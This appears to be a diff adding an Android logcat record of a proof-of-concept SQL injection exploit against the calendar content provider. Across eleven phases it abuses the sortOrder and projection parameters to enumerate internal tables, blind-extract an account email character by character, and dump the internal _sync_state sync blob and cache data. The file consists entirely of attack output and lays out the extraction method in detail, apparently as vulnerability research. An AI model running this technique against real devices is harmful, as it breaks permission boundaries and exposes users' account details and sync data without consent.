@@ -1,0 +1,172 @@
+--------- beginning of main
+09-25 09:33:14.268 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:14.268 23509 23541 D CalSortSQLi: PHASE 1: Confirm sortOrder injection
+09-25 09:33:14.268 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:14.268 23509 23541 D CalSortSQLi: [*] Test: CASE WHEN 1=1 (should sort ascending)
+09-25 09:33:14.272 23509 23541 D CalSortSQLi:   First _id with 1=1: 2
+09-25 09:33:14.272 23509 23541 D CalSortSQLi: [*] Test: CASE WHEN 1=0 (should sort descending)
+09-25 09:33:14.275 23509 23541 D CalSortSQLi:   First _id with 1=0: 692
+09-25 09:33:14.275 23509 23541 D CalSortSQLi: [!] CONFIRMED: Boolean blind injection works from app!
+09-25 09:33:14.275 23509 23541 D CalSortSQLi:     Different sort orders prove SQL control
+09-25 09:33:14.275 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:14.275 23509 23541 D CalSortSQLi: PHASE 2: Enumerate internal DB tables
+09-25 09:33:14.275 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:14.275 23509 23541 D CalSortSQLi: [*] Extracting table names via sortOrder subquery...
+09-25 09:33:14.276 23509 23541 D CalSortSQLi:   Query succeeded (injection accepted).
+09-25 09:33:14.276 23509 23541 D CalSortSQLi:   Rows returned: 5
+09-25 09:33:14.277 23509 23541 D CalSortSQLi: [*] Alternative: extract table list via CASE+blind...
+09-25 09:33:14.279 23509 23541 D CalSortSQLi:   Tables exist (count > 0 is TRUE). First _id: 2
+09-25 09:33:14.289 23509 23541 D CalSortSQLi:   Table count > 5: TRUE (different sort)
+09-25 09:33:14.293 23509 23541 D CalSortSQLi:   Table count > 10: TRUE (different sort)
+09-25 09:33:14.300 23509 23541 D CalSortSQLi:   Table count > 15: TRUE (different sort)
+09-25 09:33:14.304 23509 23541 D CalSortSQLi:   Table count > 20: TRUE (different sort)
+09-25 09:33:14.307 23509 23541 D CalSortSQLi:   Table count > 25: TRUE (different sort)
+09-25 09:33:14.307 23509 23541 D CalSortSQLi: [*] Probing known internal tables...
+09-25 09:33:14.308 23509 23541 D CalSortSQLi:   [+] _sync_state — ACCESSIBLE
+09-25 09:33:14.309 23509 23541 D CalSortSQLi:   [+] _sync_state_metadata — ACCESSIBLE
+09-25 09:33:14.310 23509 23541 D CalSortSQLi:   [+] CalendarMetaData — ACCESSIBLE
+09-25 09:33:14.311 23509 23541 D CalSortSQLi:   [+] Calendars — ACCESSIBLE
+09-25 09:33:14.312 23509 23541 D CalSortSQLi:   [+] Events — ACCESSIBLE
+09-25 09:33:14.317 23509 23541 D CalSortSQLi:   [+] Instances — ACCESSIBLE
+09-25 09:33:14.319 23509 23541 D CalSortSQLi:   [+] EventsRawTimes — ACCESSIBLE
+09-25 09:33:14.322 23509 23541 D CalSortSQLi:   [+] Attendees — ACCESSIBLE
+09-25 09:33:14.323 23509 23541 D CalSortSQLi:   [+] Reminders — ACCESSIBLE
+09-25 09:33:14.324 23509 23541 D CalSortSQLi:   [+] CalendarAlerts — ACCESSIBLE
+09-25 09:33:14.325 23509 23541 D CalSortSQLi:   [+] ExtendedProperties — ACCESSIBLE
+09-25 09:33:14.326 23509 23541 D CalSortSQLi:   [+] Colors — ACCESSIBLE
+09-25 09:33:14.328 23509 23541 D CalSortSQLi:   [+] CalendarCache — ACCESSIBLE
+09-25 09:33:14.328 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:14.328 23509 23541 D CalSortSQLi: PHASE 3: Extract account emails
+09-25 09:33:14.328 23509 23541 D CalSortSQLi:   (cross-table: Events→Calendars)
+09-25 09:33:14.328 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:14.328 23509 23541 D CalSortSQLi: [*] Extracting account_name from Calendars table...
+09-25 09:33:14.328 23509 23541 D CalSortSQLi:     (This data is in Calendars table, accessed via Events URI)
+09-25 09:33:14.329 23509 23541 D CalSortSQLi:   Query with subquery in sortOrder succeeded.
+09-25 09:33:14.329 23509 23541 D CalSortSQLi:   Rows: 5
+09-25 09:33:14.329 23509 23541 D CalSortSQLi:   _id=2 title=New Year's Day
+09-25 09:33:14.329 23509 23541 D CalSortSQLi:   _id=3 title=Rath Yatra
+09-25 09:33:14.329 23509 23541 D CalSortSQLi:   _id=4 title=Republic Day
+09-25 09:33:14.329 23509 23541 D CalSortSQLi:   _id=5 title=Ugadi
+09-25 09:33:14.329 23509 23541 D CalSortSQLi:   _id=6 title=Ambedkar Jayanti
+09-25 09:33:14.329 23509 23541 D CalSortSQLi: [*] Blind extraction of first account email character...
+09-25 09:33:14.648 23509 23541 D CalSortSQLi:   Progress: "sandiyotes"
+09-25 09:33:14.896 23509 23541 D CalSortSQLi:   Progress: "sandiyotest@gmail.co"
+09-25 09:33:14.928 23509 23541 D CalSortSQLi:   [!] EXTRACTED account_name: sandiyotest@gmail.com
+09-25 09:33:14.928 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:14.928 23509 23541 D CalSortSQLi: PHASE 4: Extract _sync_state data
+09-25 09:33:14.928 23509 23541 D CalSortSQLi:   (internal table, no public API)
+09-25 09:33:14.928 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:14.928 23509 23541 D CalSortSQLi: [*] _sync_state is an internal table not exposed via any
+09-25 09:33:14.928 23509 23541 D CalSortSQLi:     public ContentProvider URI. Contains sync auth tokens.
+09-25 09:33:14.928 23509 23541 D CalSortSQLi: [*] Checking _sync_state row count...
+09-25 09:33:14.951 23509 23541 D CalSortSQLi:   _sync_state rows: 1
+09-25 09:33:14.951 23509 23541 D CalSortSQLi: [*] Extracting account_name from _sync_state...
+09-25 09:33:15.476 23509 23541 D CalSortSQLi:   [!] EXTRACTED _sync_state account: sandiyotest@gmail.com
+09-25 09:33:15.476 23509 23541 D CalSortSQLi: [*] Extracting data blob length from _sync_state...
+09-25 09:33:15.501 23509 23541 D CalSortSQLi:   _sync_state data blob length: 513 bytes
+09-25 09:33:15.501 23509 23541 D CalSortSQLi: [*] Extracting first 64 bytes of sync data (hex)...
+09-25 09:33:17.205 23509 23541 D CalSortSQLi:   [!] _sync_state data (hex): 7B2276657273696F6E223A31362C2266697273745365656E223A66616C73652C
+09-25 09:33:17.205 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:17.205 23509 23541 D CalSortSQLi: PHASE 5: Extract CalendarMetaData
+09-25 09:33:17.205 23509 23541 D CalSortSQLi:   (internal table, no public API)
+09-25 09:33:17.205 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:17.205 23509 23541 D CalSortSQLi: [*] CalendarMetaData: internal table with timezone + instance range
+09-25 09:33:17.231 23509 23541 D CalSortSQLi:   CalendarMetaData rows: 1
+09-25 09:33:17.667 23509 23541 D CalSortSQLi:   [!] EXTRACTED timezone: Asia/Kolkata
+09-25 09:33:17.667 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:17.667 23509 23541 D CalSortSQLi: PHASE 6: Extract event organizer emails
+09-25 09:33:17.668 23509 23541 D CalSortSQLi:   via sortOrder subquery
+09-25 09:33:17.668 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:17.668 23509 23541 D CalSortSQLi: [*] Extracting organizer emails from Events table...
+09-25 09:33:17.695 23509 23541 D CalSortSQLi:   Total events in DB: 272
+09-25 09:33:17.695 23509 23541 D CalSortSQLi: [*] Extracting distinct organizer emails...
+09-25 09:33:17.720 23509 23541 D CalSortSQLi:   Distinct organizers: 2
+09-25 09:33:18.900 23509 23541 D CalSortSQLi:   [!] EXTRACTED organizer email: en-gb.indian#holiday@group.v.calendar.google.com
+09-25 09:33:18.900 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:18.900 23509 23541 D CalSortSQLi: PHASE 7: Extract sync tokens/keys
+09-25 09:33:18.900 23509 23541 D CalSortSQLi:   (auth material from _sync_state)
+09-25 09:33:18.900 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:18.901 23509 23541 D CalSortSQLi: [*] Extracting account_type from _sync_state...
+09-25 09:33:19.233 23509 23541 D CalSortSQLi:   [!] _sync_state account_type: com.google
+09-25 09:33:19.233 23509 23541 D CalSortSQLi: [*] Extracting _sync_id values from Events...
+09-25 09:33:20.084 23509 23541 D CalSortSQLi:   [!] Event _sync_id: 20260101_g3cd53lk38acpd0ag0i9o8ldl8
+09-25 09:33:20.084 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:20.084 23509 23541 D CalSortSQLi: PHASE 8: Boolean-blind char extraction
+09-25 09:33:20.084 23509 23541 D CalSortSQLi:   (byte-by-byte from internal tables)
+09-25 09:33:20.084 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:20.084 23509 23541 D CalSortSQLi: [*] Full blind extraction demo: account_name from Calendars
+09-25 09:33:20.084 23509 23541 D CalSortSQLi:     Using binary search per character position
+09-25 09:33:20.095 23509 23541 D CalSortSQLi:   [1] char=115 's' → "s"
+09-25 09:33:20.106 23509 23541 D CalSortSQLi:   [2] char=97 'a' → "sa"
+09-25 09:33:20.119 23509 23541 D CalSortSQLi:   [3] char=110 'n' → "san"
+09-25 09:33:20.132 23509 23541 D CalSortSQLi:   [4] char=100 'd' → "sand"
+09-25 09:33:20.143 23509 23541 D CalSortSQLi:   [5] char=105 'i' → "sandi"
+09-25 09:33:20.154 23509 23541 D CalSortSQLi:   [6] char=121 'y' → "sandiy"
+09-25 09:33:20.166 23509 23541 D CalSortSQLi:   [7] char=111 'o' → "sandiyo"
+09-25 09:33:20.178 23509 23541 D CalSortSQLi:   [8] char=116 't' → "sandiyot"
+09-25 09:33:20.189 23509 23541 D CalSortSQLi:   [9] char=101 'e' → "sandiyote"
+09-25 09:33:20.200 23509 23541 D CalSortSQLi:   [10] char=115 's' → "sandiyotes"
+09-25 09:33:20.211 23509 23541 D CalSortSQLi:   [11] char=116 't' → "sandiyotest"
+09-25 09:33:20.222 23509 23541 D CalSortSQLi:   [12] char=64 '@' → "sandiyotest@"
+09-25 09:33:20.233 23509 23541 D CalSortSQLi:   [13] char=103 'g' → "sandiyotest@g"
+09-25 09:33:20.243 23509 23541 D CalSortSQLi:   [14] char=109 'm' → "sandiyotest@gm"
+09-25 09:33:20.254 23509 23541 D CalSortSQLi:   [15] char=97 'a' → "sandiyotest@gma"
+09-25 09:33:20.265 23509 23541 D CalSortSQLi:   [16] char=105 'i' → "sandiyotest@gmai"
+09-25 09:33:20.276 23509 23541 D CalSortSQLi:   [17] char=108 'l' → "sandiyotest@gmail"
+09-25 09:33:20.286 23509 23541 D CalSortSQLi:   [18] char=46 '.' → "sandiyotest@gmail."
+09-25 09:33:20.297 23509 23541 D CalSortSQLi:   [19] char=99 'c' → "sandiyotest@gmail.c"
+09-25 09:33:20.308 23509 23541 D CalSortSQLi:   [20] char=111 'o' → "sandiyotest@gmail.co"
+09-25 09:33:20.319 23509 23541 D CalSortSQLi:   [21] char=109 'm' → "sandiyotest@gmail.com"
+09-25 09:33:20.320 23509 23541 D CalSortSQLi:   [!!!] FULL EXTRACTION RESULT:
+09-25 09:33:20.320 23509 23541 D CalSortSQLi:   Account email: sandiyotest@gmail.com
+09-25 09:33:20.320 23509 23541 D CalSortSQLi:   Extracted 21 chars in 236ms
+09-25 09:33:20.320 23509 23541 D CalSortSQLi:   IMPACT: Zero-interaction PII leak via sortOrder SQLi
+09-25 09:33:20.320 23509 23541 D CalSortSQLi:   The app only has READ_CALENDAR permission.
+09-25 09:33:20.320 23509 23541 D CalSortSQLi:   _sync_state, CalendarMetaData, and internal tables
+09-25 09:33:20.320 23509 23541 D CalSortSQLi:   are NOT exposed through any public API.
+09-25 09:33:20.320 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:20.320 23509 23541 D CalSortSQLi: PHASE 9: Full _sync_state blob extraction
+09-25 09:33:20.320 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:20.320 23509 23541 D CalSortSQLi: [*] Extracting full _sync_state data blob (513 bytes)...
+09-25 09:33:20.320 23509 23541 D CalSortSQLi:     This blob contains sync tokens NOT exposed via any API
+09-25 09:33:20.349 23509 23541 D CalSortSQLi:   Blob length: 513 bytes
+09-25 09:33:22.685 23509 23541 D CalSortSQLi:   [80/1026] extracting...
+09-25 09:33:24.753 23509 23541 D CalSortSQLi:   [160/1026] extracting...
+09-25 09:33:26.888 23509 23541 D CalSortSQLi:   [240/1026] extracting...
+09-25 09:33:28.964 23509 23541 D CalSortSQLi:   [320/1026] extracting...
+09-25 09:33:31.128 23509 23541 D CalSortSQLi:   [400/1026] extracting...
+09-25 09:33:33.272 23509 23541 D CalSortSQLi:   [480/1026] extracting...
+09-25 09:33:34.054 23509 23541 D CalSortSQLi:   [!] Full hex (512 chars):
+09-25 09:33:34.054 23509 23541 D CalSortSQLi:   [!] DECODED sync data:
+09-25 09:33:34.054 23509 23541 D CalSortSQLi:     {"version":16,"firstSeen":false,"jellyBeanOrNewer":true,"b38085245":2147483647,"
+09-25 09:33:34.054 23509 23541 D CalSortSQLi:     package":"com.google.android.calendar","sandiyotest@gmail.com":{},"en-gb.indian#
+09-25 09:33:34.054 23509 23541 D CalSortSQLi:     holiday@group.v.calendar.google.com":{"window_end":1822176000000,"feed_updated_t
+09-25 09:33:34.054 23509 23541 D CalSortSQLi:     ime":"2026-09-14
+09-25 09:33:34.054 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:34.054 23509 23541 D CalSortSQLi: PHASE 10: Projection injection test
+09-25 09:33:34.054 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:34.054 23509 23541 D CalSortSQLi: [*] Testing if projection-based injection also works...
+09-25 09:33:34.054 23509 23541 D CalSortSQLi:     (Direct data readout vs blind extraction)
+09-25 09:33:34.056 23509 23541 D CalSortSQLi:   [!!!] PROJECTION INJECTION WORKS!
+09-25 09:33:34.056 23509 23541 D CalSortSQLi:   [!!!] Direct table enumeration:
+09-25 09:33:34.056 23509 23541 D CalSortSQLi:     android_metadata,_sync_state,_sync_state_metadata,Colors,Calendars,Events,sqlite_sequence,EventsRawTimes,Instances,CalendarMetaData,CalendarCache,Attendees,Reminders,CalendarAlerts,ExtendedProperties
+09-25 09:33:34.058 23509 23541 D CalSortSQLi:   [!!!] DIRECT _sync_state readout: sandiyotest@gmail.com:com.google
+09-25 09:33:34.060 23509 23541 D CalSortSQLi:   [!!!] DIRECT sync blob extraction! Length: 1026 hex chars
+09-25 09:33:34.060 23509 23541 D CalSortSQLi:   [!!!] DECODED sync data (full):
+09-25 09:33:34.060 23509 23541 D CalSortSQLi:     {"version":16,"firstSeen":false,"jellyBeanOrNewer":true,"b38085245":2147483647,"package":"com.google
+09-25 09:33:34.060 23509 23541 D CalSortSQLi:     .android.calendar","sandiyotest@gmail.com":{},"en-gb.indian#holiday@group.v.calendar.google.com":{"w
+09-25 09:33:34.060 23509 23541 D CalSortSQLi:     indow_end":1822176000000,"feed_updated_time":"2026-09-14T07:55:59.492Z","last_sync_time":17898743201
+09-25 09:33:34.060 23509 23541 D CalSortSQLi:     28,"do_incremental_sync":true},"en.indian#holiday@group.v.calendar.google.com":{"window_end":1822176
+09-25 09:33:34.060 23509 23541 D CalSortSQLi:     000000,"feed_updated_time":"2026-09-14T07:55:59.492Z","last_sync_time":1789874320618,"do_incremental
+09-25 09:33:34.060 23509 23541 D CalSortSQLi:     _sync":true}}
+09-25 09:33:34.060 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:34.060 23509 23541 D CalSortSQLi: PHASE 11: Extract CalendarCache data
+09-25 09:33:34.060 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:34.086 23509 23541 D CalSortSQLi:   CalendarCache rows: 4
+09-25 09:33:34.086 23509 23541 D CalSortSQLi: [*] Extracting CalendarCache keys...
+09-25 09:33:34.871 23509 23541 D CalSortSQLi:   [!] CalendarCache key: timezoneDatabaseVersion
+09-25 09:33:34.871 23509 23541 D CalSortSQLi: [*] Extracting CalendarCache values...
+09-25 09:33:34.997 23509 23541 D CalSortSQLi:   [!] CalendarCache value: 2026c
+09-25 09:33:34.998 23509 23541 D CalSortSQLi: ========================================
+09-25 09:33:34.998 23509 23541 D CalSortSQLi: ALL TESTS COMPLETE
+09-25 09:33:34.998 23509 23541 D CalSortSQLi: ========================================
